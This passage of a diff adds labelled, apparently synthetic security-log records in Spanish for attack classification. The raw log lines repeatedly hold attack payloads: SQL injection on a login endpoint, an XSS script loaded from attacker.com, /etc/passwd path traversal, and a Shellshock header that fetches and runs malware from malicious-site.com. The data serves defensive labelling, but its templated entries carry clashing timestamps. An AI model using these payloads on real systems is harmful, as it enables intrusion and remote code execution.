+        "log_raw": "185.45.22.21 - - [10/Jun/2026:08:54:39 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 47,
+        "timestamp": "2026-06-10T08:54:45Z",
+        "ip_origen": "185.45.22.178",
+        "log_raw": "185.45.22.178 - - [10/Jun/2026:08:54:45 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 48,
+        "timestamp": "2026-06-10T08:54:48Z",
+        "ip_origen": "82.113.9.171",
+        "log_raw": "82.113.9.171 - - [10/Jun/2026:08:54:48 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 49,
+        "timestamp": "2026-06-10T08:54:49Z",
+        "ip_origen": "82.113.9.165",
+        "log_raw": "82.113.9.165 - - [10/Jun/2026:08:54:49 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 50,
+        "timestamp": "2026-06-10T08:54:50Z",
+        "ip_origen": "185.45.22.160",
+        "log_raw": "185.45.22.160 - - [10/Jun/2026:08:54:50 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 51,
+        "timestamp": "2026-06-10T08:54:55Z",
+        "ip_origen": "82.113.9.7",
+        "log_raw": "82.113.9.7 - - [10/Jun/2026:08:54:55 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 52,
+        "timestamp": "2026-06-10T08:55:02Z",
+        "ip_origen": "82.113.9.171",
+        "log_raw": "82.113.9.171 - - [10/Jun/2026:08:55:02 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 53,
+        "timestamp": "2026-06-10T08:55:05Z",
+        "ip_origen": "185.45.22.140",
+        "log_raw": "185.45.22.140 - - [10/Jun/2026:08:55:05 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 54,
+        "timestamp": "2026-06-10T08:55:06Z",
+        "ip_origen": "185.45.22.219",
+        "log_raw": "185.45.22.219 - - [10/Jun/2026:08:55:06 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 55,
+        "timestamp": "2026-06-10T08:55:09Z",
+        "ip_origen": "82.113.9.172",
+        "log_raw": "82.113.9.172 - - [10/Jun/2026:08:55:09 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 56,
+        "timestamp": "2026-06-10T08:55:12Z",
+        "ip_origen": "192.168.1.96",
+        "log_raw": "192.168.1.96 - - [10/Jun/2026:08:55:12 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 57,
+        "timestamp": "2026-06-10T08:55:18Z",
+        "ip_origen": "82.113.9.188",
+        "log_raw": "82.113.9.188 - - [10/Jun/2026:08:55:18 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 58,
+        "timestamp": "2026-06-10T08:55:19Z",
+        "ip_origen": "192.168.1.11",
+        "log_raw": "192.168.1.11 - - [10/Jun/2026:08:55:19 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 59,
+        "timestamp": "2026-06-10T08:55:22Z",
+        "ip_origen": "185.45.22.219",
+        "log_raw": "185.45.22.219 - - [10/Jun/2026:08:55:22 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 60,
+        "timestamp": "2026-06-10T08:55:28Z",
+        "ip_origen": "82.113.9.181",
+        "log_raw": "82.113.9.181 - - [10/Jun/2026:08:55:28 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 61,
+        "timestamp": "2026-06-10T08:55:30Z",
+        "ip_origen": "185.45.22.133",
+        "log_raw": "185.45.22.133 - - [10/Jun/2026:08:55:30 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 62,
+        "timestamp": "2026-06-10T08:55:34Z",
+        "ip_origen": "185.45.22.134",
+        "log_raw": "185.45.22.134 - - [10/Jun/2026:08:55:34 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 63,
+        "timestamp": "2026-06-10T08:55:35Z",
+        "ip_origen": "185.45.22.178",
+        "log_raw": "185.45.22.178 - - [10/Jun/2026:08:55:35 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 64,
+        "timestamp": "2026-06-10T08:55:41Z",
+        "ip_origen": "185.45.22.133",
+        "log_raw": "185.45.22.133 - - [10/Jun/2026:08:55:41 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 65,
+        "timestamp": "2026-06-10T08:55:44Z",
+        "ip_origen": "192.168.1.163",
+        "log_raw": "192.168.1.163 - - [10/Jun/2026:08:55:44 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 66,
+        "timestamp": "2026-06-10T08:55:48Z",
+        "ip_origen": "82.113.9.71",
+        "log_raw": "82.113.9.71 - - [10/Jun/2026:08:55:48 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 67,
+        "timestamp": "2026-06-10T08:55:54Z",
+        "ip_origen": "82.113.9.198",
+        "log_raw": "82.113.9.198 - - [10/Jun/2026:08:55:54 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 68,
+        "timestamp": "2026-06-10T08:55:57Z",
+        "ip_origen": "185.45.22.234",
+        "log_raw": "185.45.22.234 - - [10/Jun/2026:08:55:57 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 69,
+        "timestamp": "2026-06-10T08:56:04Z",
+        "ip_origen": "185.45.22.26",
+        "log_raw": "185.45.22.26 - - [10/Jun/2026:08:56:04 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 70,
+        "timestamp": "2026-06-10T08:56:09Z",
+        "ip_origen": "185.45.22.18",
+        "log_raw": "185.45.22.18 - - [10/Jun/2026:08:56:09 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 71,
+        "timestamp": "2026-06-10T08:56:13Z",
+        "ip_origen": "185.45.22.86",
+        "log_raw": "185.45.22.86 - - [10/Jun/2026:08:56:13 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 72,
+        "timestamp": "2026-06-10T08:56:17Z",
+        "ip_origen": "82.113.9.180",
+        "log_raw": "82.113.9.180 - - [10/Jun/2026:08:56:17 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 73,
+        "timestamp": "2026-06-10T08:56:18Z",
+        "ip_origen": "185.45.22.15",
+        "log_raw": "185.45.22.15 - - [10/Jun/2026:08:56:18 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 74,
+        "timestamp": "2026-06-10T08:56:20Z",
+        "ip_origen": "192.168.1.85",
+        "log_raw": "192.168.1.85 - - [10/Jun/2026:08:56:20 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 75,
+        "timestamp": "2026-06-10T08:56:24Z",
+        "ip_origen": "82.113.9.198",
+        "log_raw": "82.113.9.198 - - [10/Jun/2026:08:56:24 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 76,
+        "timestamp": "2026-06-10T08:56:29Z",
+        "ip_origen": "82.113.9.180",
+        "log_raw": "82.113.9.180 - - [10/Jun/2026:08:56:29 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 77,
+        "timestamp": "2026-06-10T08:56:34Z",
+        "ip_origen": "185.45.22.133",
+        "log_raw": "185.45.22.133 - - [10/Jun/2026:08:56:34 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 78,
+        "timestamp": "2026-06-10T08:56:36Z",
+        "ip_origen": "185.45.22.234",
+        "log_raw": "185.45.22.234 - - [10/Jun/2026:08:56:36 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 79,
+        "timestamp": "2026-06-10T08:56:37Z",
+        "ip_origen": "185.45.22.60",
+        "log_raw": "185.45.22.60 - - [10/Jun/2026:08:56:37 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 80,
+        "timestamp": "2026-06-10T08:56:42Z",
+        "ip_origen": "185.45.22.192",
+        "log_raw": "185.45.22.192 - - [10/Jun/2026:08:56:42 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 81,
+        "timestamp": "2026-06-10T08:56:47Z",
+        "ip_origen": "185.45.22.63",
+        "log_raw": "185.45.22.63 - - [10/Jun/2026:08:56:47 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 82,
+        "timestamp": "2026-06-10T08:56:52Z",
+        "ip_origen": "185.45.22.125",
+        "log_raw": "185.45.22.125 - - [10/Jun/2026:08:56:52 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 83,
+        "timestamp": "2026-06-10T08:56:56Z",
+        "ip_origen": "82.113.9.111",
+        "log_raw": "82.113.9.111 - - [10/Jun/2026:08:56:56 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 84,
+        "timestamp": "2026-06-10T08:57:01Z",
+        "ip_origen": "192.168.1.163",
+        "log_raw": "192.168.1.163 - - [10/Jun/2026:08:57:01 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 85,
+        "timestamp": "2026-06-10T08:57:03Z",
+        "ip_origen": "185.45.22.133",
+        "log_raw": "185.45.22.133 - - [10/Jun/2026:08:57:03 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 86,
+        "timestamp": "2026-06-10T08:57:07Z",
+        "ip_origen": "82.113.9.236",
+        "log_raw": "82.113.9.236 - - [10/Jun/2026:08:57:07 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 87,
+        "timestamp": "2026-06-10T08:57:12Z",
+        "ip_origen": "192.168.1.85",
+        "log_raw": "192.168.1.85 - - [10/Jun/2026:08:57:12 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 88,
+        "timestamp": "2026-06-10T08:57:18Z",
+        "ip_origen": "82.113.9.111",
+        "log_raw": "82.113.9.111 - - [10/Jun/2026:08:57:18 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 89,
+        "timestamp": "2026-06-10T08:57:24Z",
+        "ip_origen": "82.113.9.188",
+        "log_raw": "82.113.9.188 - - [10/Jun/2026:08:57:24 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 90,
+        "timestamp": "2026-06-10T08:57:31Z",
+        "ip_origen": "185.45.22.134",
